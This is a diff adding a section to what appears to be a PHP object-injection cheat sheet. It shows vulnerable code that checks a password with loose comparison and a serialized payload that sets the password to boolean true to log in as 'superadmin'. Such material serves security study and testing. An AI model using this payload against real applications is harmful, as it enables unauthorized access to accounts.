@@ -159,3 +159,17 @@ class Example2
 ```
 print urlencode(serialize(new Example2));
 // We need to use URL encoding since we are injecting the object via a URL.
+
+Bypass auth :
+
+```php
+<?php if($data['password'] == $password){
+	$auth=True;
+	}
+?>
+```
+
+If we set the password not to a string but to '1' (True) it will work because str=True is True
+
+	a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1;}
+	
